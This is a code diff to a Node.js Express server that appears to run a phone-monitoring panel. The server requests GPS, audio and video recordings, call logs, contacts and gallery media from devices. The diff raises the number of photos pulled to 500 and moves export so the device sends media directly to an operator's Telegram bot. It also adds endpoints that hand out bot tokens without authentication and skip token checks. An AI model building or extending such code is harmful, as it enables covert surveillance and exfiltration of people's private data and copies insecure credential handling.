@@ -204,6 +204,7 @@ const audioRequestFlags = new Map();
 const videoRequestFlags = new Map();
 const callLogsData = new Map();
 const contactsData = new Map();
+const exportRequestFlags = new Map(); // নতুন
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -315,7 +316,7 @@ app.post("/api/gallery/request", requireLogin, async (req, res) => {
   if (feature.rows.length > 0 && feature.rows[0].gallery === false) {
     return res.status(403).json({ error: "Gallery disabled by admin." });
   }
-  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 100) : 100;
+  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
   galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
   res.json({ success: true, count: safeCount });
 });
@@ -342,7 +343,7 @@ app.post("/api/gallery/upload", async (req, res) => {
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
       return res.status(401).json({ error: "Invalid device token." });
     }
-    const latest = media.slice(0, 100);
+    const latest = media.slice(0, 500);
     galleryData.set(deviceId, latest);
     res.json({ success: true, count: latest.length });
   } catch (e) {
@@ -430,7 +431,11 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
       fs.unlink(req.file.path, () => {});
       return res.status(401).json({ error: "Invalid device token." });
     }
-    res.json({ success: true, filePath: req.file.path });
+    // deviceId দিয়ে ফাইলের নাম বদলান
+    const newFilename = `${deviceId}_${req.file.filename}`;
+    const newPath = path.join(__dirname, 'uploads', 'audio', newFilename);
+    fs.renameSync(req.file.path, newPath);
+    res.json({ success: true, filePath: newPath });
   } catch (e) {
     console.error(e);
     res.status(500).json({ error: "Audio upload failed" });
@@ -447,7 +452,8 @@ app.get("/api/audio/list", requireLogin, async (req, res) => {
   const dir = path.join(__dirname, 'uploads', 'audio');
   fs.readdir(dir, (err, files) => {
     if (err) return res.status(500).json({ error: "Failed to list audio files" });
-    res.json({ files });
+    const userFiles = files.filter(f => f.startsWith(`${deviceId}_`));
+    res.json({ files: userFiles });
   });
 });
 
@@ -504,7 +510,10 @@ app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
       fs.unlink(req.file.path, () => {});
       return res.status(401).json({ error: "Invalid device token." });
     }
-    res.json({ success: true, filePath: req.file.path });
+    const newFilename = `${deviceId}_${req.file.filename}`;
+    const newPath = path.join(__dirname, 'uploads', 'video', newFilename);
+    fs.renameSync(req.file.path, newPath);
+    res.json({ success: true, filePath: newPath });
   } catch (e) {
     console.error(e);
     res.status(500).json({ error: "Video upload failed" });
@@ -521,7 +530,8 @@ app.get("/api/video/list", requireLogin, async (req, res) => {
   const dir = path.join(__dirname, 'uploads', 'video');
   fs.readdir(dir, (err, files) => {
     if (err) return res.status(500).json({ error: "Failed to list video files" });
-    res.json({ files });
+    const userFiles = files.filter(f => f.startsWith(`${deviceId}_`));
+    res.json({ files: userFiles });
   });
 });
 
@@ -620,6 +630,7 @@ app.get("/api/telegram/settings", requireLogin, async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch Telegram settings." }); }
 });
 
+// নতুন: Export request flag set করা, ডিভাইস সরাসরি পাঠাবে
 app.post("/api/gallery/export", requireLogin, async (req, res) => {
   try {
     const { deviceId } = req.body;
@@ -628,63 +639,45 @@ app.post("/api/gallery/export", requireLogin, async (req, res) => {
     if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
       return res.status(403).json({ error: "Not your device." });
     }
-    const media = galleryData.get(deviceId) || [];
-    if (media.length === 0) return res.json({ success: true, message: "No media to export." });
 
     const tgRes = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
     if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) {
-      return res.status(400).json({ error: "Telegram bot not configured. Please set bot token and chat ID in settings." });
+      return res.status(400).json({ error: "Telegram bot not configured. Please set bot token and chat ID in Settings." });
     }
 
-    const botToken = tgRes.rows[0].bot_token;
-    const chatId = tgRes.rows[0].chat_id;
+    exportRequestFlags.set(deviceId, {
+      requested: true,
+      botToken: tgRes.rows[0].bot_token,
+      chatId: tgRes.rows[0].chat_id
+    });
 
-    for (const item of media) {
-      if (!item.thumbnailBase64) continue;
-      const imageBuffer = Buffer.from(item.thumbnailBase64, 'base64');
-      await sendPhotoToTelegram(botToken, chatId, imageBuffer, item.filename);
-    }
-    res.json({ success: true, message: `Exported ${media.length} items to Telegram.` });
+    res.json({ success: true, message: "Export request sent to device. It will send media directly to Telegram." });
   } catch (e) {
     console.error(e);
     res.status(500).json({ error: "Gallery export failed." });
   }
 });
 
-function sendPhotoToTelegram(botToken, chatId, photoBuffer, caption) {
-  return new Promise((resolve, reject) => {
-    const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substring(2);
-    const postData = Buffer.concat([
-      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
-      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`),
-      photoBuffer,
-      Buffer.from(`\r\n--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`),
-      Buffer.from(`--${boundary}--\r\n`)
-    ]);
+// ডিভাইস এই endpoint থেকে export request পাবে
+app.get("/api/gallery/export-request", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const flag = exportRequestFlags.get(deviceId);
+  if (flag) {
+    exportRequestFlags.delete(deviceId);
+    res.json({ requested: true, botToken: flag.botToken, chatId: flag.chatId });
+  } else {
+    res.json({ requested: false });
+  }
+});
 
-    const options = {
-      hostname: 'api.telegram.org',
-      path: `/bot${botToken}/sendPhoto`,
-      method: 'POST',
-      headers: {
-        'Content-Type': `multipart/form-data; boundary=${boundary}`,
-        'Content-Length': postData.length
-      }
-    };
-
-    const req = https.request(options, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        if (res.statusCode === 200) resolve(JSON.parse(data));
-        else reject(new Error(`Telegram API error: ${res.statusCode} - ${data}`));
-      });
-    });
-    req.on('error', reject);
-    req.write(postData);
-    req.end();
-  });
-}
+// ডিভাইস export শেষে জানাবে (ঐচ্ছিক)
+app.post("/api/gallery/export-done", async (req, res) => {
+  const { deviceId, deviceToken, sentCount } = req.body;
+  // token যাচাই ঐচ্ছিক
+  console.log(`Export done for ${deviceId}, sent ${sentCount} items.`);
+  res.json({ success: true });
+});
 
 // ================= ADMIN API =================
 app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
@@ -725,7 +718,6 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
 });
 
 // ================= ADMIN ACTION ENDPOINTS =================
-
 app.post("/api/admin/gps/request", requireLogin, requireAdmin, async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -761,7 +753,7 @@ app.post("/api/admin/video/request", requireLogin, requireAdmin, async (req, res
 app.post("/api/admin/gallery/request", requireLogin, requireAdmin, async (req, res) => {
   const { deviceId, count } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 100) : 100;
+  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
   galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
   res.json({ success: true, count: safeCount });
 });
@@ -776,24 +768,16 @@ app.post("/api/admin/gallery/export", requireLogin, requireAdmin, async (req, re
       [req.session.userId]
     );
     if (adminRes.rows.length === 0 || !adminRes.rows[0].bot_token || !adminRes.rows[0].chat_id) {
-      return res.status(400).json({ error: "Admin Telegram settings not configured. Please set bot token and chat ID in Settings." });
+      return res.status(400).json({ error: "Admin Telegram settings not configured." });
     }
 
-    const botToken = adminRes.rows[0].bot_token;
-    const chatId = adminRes.rows[0].chat_id;
-    const media = galleryData.get(deviceId) || [];
+    exportRequestFlags.set(deviceId, {
+      requested: true,
+      botToken: adminRes.rows[0].bot_token,
+      chatId: adminRes.rows[0].chat_id
+    });
 
-    if (media.length === 0) {
-      return res.json({ success: true, message: "No media to export." });
-    }
-
-    for (const item of media) {
-      if (!item.thumbnailBase64) continue;
-      const imageBuffer = Buffer.from(item.thumbnailBase64, 'base64');
-      await sendPhotoToTelegram(botToken, chatId, imageBuffer, item.filename);
-    }
-
-    res.json({ success: true, message: `Exported ${media.length} items to Telegram.` });
+    res.json({ success: true, message: "Export request sent to device." });
   } catch (e) {
     console.error(e);
     res.status(500).json({ error: "Gallery export failed." });
